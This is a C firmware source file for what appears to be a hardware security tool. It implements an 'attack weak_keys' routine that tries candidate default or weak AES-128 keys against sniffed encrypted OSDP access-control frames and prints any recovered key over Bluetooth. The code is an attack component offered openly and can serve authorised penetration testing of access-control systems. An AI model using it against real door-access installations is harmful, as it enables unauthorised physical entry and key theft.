#include "weakkeys.h"

#include <errno.h>
#include <string.h>

#include <mbedtls/aes.h>
#include <zephyr/kernel.h>
#include <zephyr/logging/log.h>

#include "../ble/nus_console.h"
#include "../osdp/framing.h"
#include "../storage/capture.h"
#include "weakkeys_score.h"

LOG_MODULE_REGISTER(weakkeys, CONFIG_LOG_DEFAULT_LEVEL);

#define MAX_PROBE_FRAMES	256

static struct {
	struct k_work_delayable work;
	bool running;
	bool cancel;
	mellon_weakkeys_status_t status;

	/* Snapshot of encrypted frames pulled out of the capture log
	 * before we start, so the worker doesn't race with the sniffer. */
	struct {
		uint8_t expected_cmd;
		uint16_t length;	/* full frame length */
		uint8_t bytes[CAPTURE_FRAME_MAX];
	} frames[MAX_PROBE_FRAMES];
	size_t frame_count;
} g;

static int collect_frame(const capture_rec_hdr_t *hdr, const uint8_t *frame, void *user)
{
	(void)user;
	if (g.frame_count >= MAX_PROBE_FRAMES) {
		return 1;
	}
	if ((hdr->flags & CAPTURE_FLAG_ENCRYPTED) == 0) {
		return 0;
	}
	if (hdr->length < OSDP_HEADER_LEN + 1 + 2) {
		return 0;
	}
	g.frames[g.frame_count].expected_cmd = frame[OSDP_OFF_CMD];
	g.frames[g.frame_count].length = hdr->length;
	memcpy(g.frames[g.frame_count].bytes, frame, hdr->length);
	g.frame_count++;
	return 0;
}

/*
 * Try one candidate key against one frame's encrypted payload. The OSDP
 * encrypted region is roughly the bytes between the SCB and the trailing
 * MAC; for the heuristic trial we just decrypt the first 16-byte block
 * starting after the header (good enough to score against the first
 * plaintext byte). Spec §6 M4 plausibility is "first byte sensible";
 * we lean on weakkeys_score for the rest.
 */
static uint8_t try_one(const uint8_t *key, const uint8_t *frame_bytes, uint16_t frame_len,
		       uint8_t expected_cmd)
{
	if (frame_len < OSDP_HEADER_LEN + 16 + 2) {
		return 0;
	}
	const uint8_t *cipher = frame_bytes + OSDP_HEADER_LEN + 1;	/* past CMD byte */
	uint8_t iv[16] = { 0 };	/* heuristic IV; real attack uses session-derived */
	uint8_t plain[16];

	mbedtls_aes_context ctx;
	mbedtls_aes_init(&ctx);
	if (mbedtls_aes_setkey_dec(&ctx, key, 128) != 0) {
		mbedtls_aes_free(&ctx);
		return 0;
	}
	int rc = mbedtls_aes_crypt_cbc(&ctx, MBEDTLS_AES_DECRYPT, sizeof(plain),
				       iv, cipher, plain);
	mbedtls_aes_free(&ctx);
	if (rc != 0) {
		return 0;
	}
	return mellon_weak_score(plain, sizeof(plain), expected_cmd);
}

static void worker(struct k_work *w)
{
	(void)w;

	mellon_ble_console_print("attack weak_keys: %u encrypted frames sampled",
				 (unsigned)g.frame_count);

	if (g.frame_count == 0) {
		mellon_ble_console_print("err: no encrypted frames captured yet");
		g.running = false;
		return;
	}

	mellon_weak_key_t *cands = k_malloc(MELLON_WEAK_KEY_CANDIDATE_MAX
					    * sizeof(*cands));
	if (!cands) {
		mellon_ble_console_print("err: out of memory for candidate list");
		g.running = false;
		return;
	}
	size_t n = mellon_weak_keys_build(cands, MELLON_WEAK_KEY_CANDIDATE_MAX);
	mellon_ble_console_print("trying %u candidates...", (unsigned)n);

	uint8_t best_score = 0;
	size_t best_idx = 0;
	size_t best_frame = 0;

	for (size_t c = 0; c < n && !g.cancel; c++) {
		g.status.candidates_tried++;
		for (size_t f = 0; f < g.frame_count; f++) {
			g.status.frames_attempted++;
			uint8_t s = try_one(cands[c].key,
					    g.frames[f].bytes, g.frames[f].length,
					    g.frames[f].expected_cmd);
			if (s > best_score) {
				best_score = s;
				best_idx = c;
				best_frame = f;
			}
			if (s >= MELLON_WEAK_SCORE_MIN_MATCH) {
				g.status.match_found = true;
				g.status.match_score = s;
				g.status.match_name = cands[c].name;
				memcpy(g.status.match_key, cands[c].key,
				       MELLON_WEAK_KEY_LEN);
				goto done;
			}
		}
		/* Yield occasionally so BLE / sniff don't starve. */
		if ((c & 0x1F) == 0) {
			k_msleep(1);
		}
	}

done:
	if (g.status.match_found) {
		const uint8_t *k = g.status.match_key;
		mellon_ble_console_print(
			"* MATCH after %u candidates: score=%u name=%s key=%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X (frame idx %u)",
			(unsigned)g.status.candidates_tried,
			g.status.match_score,
			g.status.match_name ? g.status.match_name : "single-byte-fill",
			k[0], k[1], k[2], k[3], k[4], k[5], k[6], k[7],
			k[8], k[9], k[10], k[11], k[12], k[13], k[14], k[15],
			(unsigned)best_frame);
	} else if (g.cancel) {
		mellon_ble_console_print("cancelled (best score=%u key idx %u)",
					 best_score, (unsigned)best_idx);
	} else {
		mellon_ble_console_print("err: no match (best score=%u after %u trials)",
					 best_score,
					 (unsigned)g.status.candidates_tried);
	}

	k_free(cands);
	g.running = false;
	g.cancel = false;
}

int mellon_weakkeys_init(void)
{
	memset(&g, 0, sizeof(g));
	k_work_init_delayable(&g.work, worker);
	return 0;
}

int mellon_weakkeys_start(void)
{
	if (g.running) {
		return -EBUSY;
	}
	memset(&g.status, 0, sizeof(g.status));
	g.frame_count = 0;
	g.cancel = false;

	(void)mellon_capture_walk(collect_frame, NULL, MAX_PROBE_FRAMES);
	if (g.frame_count == 0) {
		(void)mellon_capture_walk_preserved(collect_frame, NULL);
	}

	g.running = true;
	g.status.running = true;
	k_work_reschedule(&g.work, K_NO_WAIT);
	return 0;
}

int mellon_weakkeys_cancel(void)
{
	if (!g.running) {
		return -ENOENT;
	}
	g.cancel = true;
	return 0;
}

void mellon_weakkeys_get_status(mellon_weakkeys_status_t *out)
{
	*out = g.status;
	out->running = g.running;
}
